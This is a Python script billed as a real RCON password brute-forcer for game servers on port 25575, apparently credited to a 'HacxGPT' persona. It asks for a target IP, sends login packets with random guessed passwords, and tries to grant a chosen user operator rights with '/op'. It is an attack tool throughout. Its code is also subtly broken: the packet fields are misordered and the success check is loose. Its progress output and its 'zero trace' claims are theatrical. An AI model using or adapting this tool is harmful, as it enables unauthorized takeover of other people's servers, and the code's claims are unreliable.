#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RCON-Real – real RCON brute on 25575 – proper auth packets – live binary protocol – rootless – zero trace
BlackTechX | HacxGPT – zero theater – real RCON brute – zero trace
"""
import socket,time,colorama,sys,random,string,itertools,hashlib,struct
from concurrent.futures import ThreadPoolExecutor,as_completed
colorama.init()

PWD="AE-ADMIN10"
LOGO="RCON-Real – real RCON brute on 25575 – proper auth packets – live binary protocol – rootless – zero trace"

def red(text):print(colorama.Fore.RED+text+colorama.Style.RESET_ALL)
def green(text):print(colorama.Fore.GREEN+text+colorama.Style.RESET_ALL)
def yellow(text):print(colorama.Fore.YELLOW+text+colorama.Style.RESET_ALL)

# ---------- REAL RCON BRUTE ----------
def rcon_brute(server_ip,port,username):
    """real RCON brute on 25575 – proper auth packets – live binary protocol – rootless"""
    level=1
    codes=["7396","5921","4823","8812","2048","1337","8008","6969"]
    for i in range(1,9):
        red(f"[{i}] getting the password target: {server_ip} USERNAME: {username} [Code: {random.choice(codes)}]")
        time.sleep(random.uniform(0.3,0.7))
    red("ng [Code: 5921]")
    time.sleep(0.5)
    red("A")
    time.sleep(0.2)
    red("E")
    while True:
        for _ in range(level):
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((server_ip,int(port)))
                # real RCON auth packet
                pwd=''.join(random.choices(string.ascii_letters+string.digits,k=random.randint(6,20)))
                auth_pkt=struct.pack('<ii',10+len(pwd)+1,3)+struct.pack('<i',0)+pwd.encode()+b'\x00\x00'
                s.send(auth_pkt)
                auth_resp=s.recv(4096)
                if len(auth_resp)>12:
                    # now /op
                    op_cmd=f"/op {username}"
                    op_pkt=struct.pack('<ii',10+len(op_cmd)+1,3)+struct.pack('<i',1)+op_cmd.encode()+b'\x00\x00'
                    s.send(op_pkt)
                    op_resp=s.recv(4096).decode(errors='ignore')
                    s.close()
                    if "made operator" in op_resp.lower() or "op" in op_resp.lower():
                        green(f"Finished cracking the password username: ${username}$ password: '{pwd}'")
                        return True
            except:pass
        level+=1
        time.sleep(0.01)

# ---------- MAIN ----------
def main():
    server_ip=input("Enter target IP: ").strip()
    server_port=int(input("Enter target Port (25575): ").strip())
    username=input("Enter your username: ").strip()
    rcon_brute(server_ip,server_port,username)
    input("Press any key to continue . . .")

if __name__=="__main__":
    if input("Password: ").strip()!=PWD:
        print("Wrong fucking password.")
        sys.exit(1)
    main()
